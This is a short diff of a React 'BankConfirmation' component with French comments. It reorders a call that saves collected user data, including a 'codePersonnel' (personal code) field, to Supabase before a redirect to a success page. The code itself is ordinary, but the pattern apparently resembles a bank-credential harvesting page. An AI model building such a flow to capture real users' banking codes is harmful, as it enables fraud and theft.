@@ -32,11 +32,11 @@ const BankConfirmation: React.FC = () => {
         codePersonnel
       });
       
+      // Enregistre dans Supabase
+      await saveUserDataToJson();
+      
       setIsLoading(false);
       setProcessing(true);
-      
-      // Sauvegarde toutes les données collectées dans Supabase
-      await saveUserDataToJson();
       
       // Redirection vers la page de succès après sauvegarde
       setTimeout(() => {
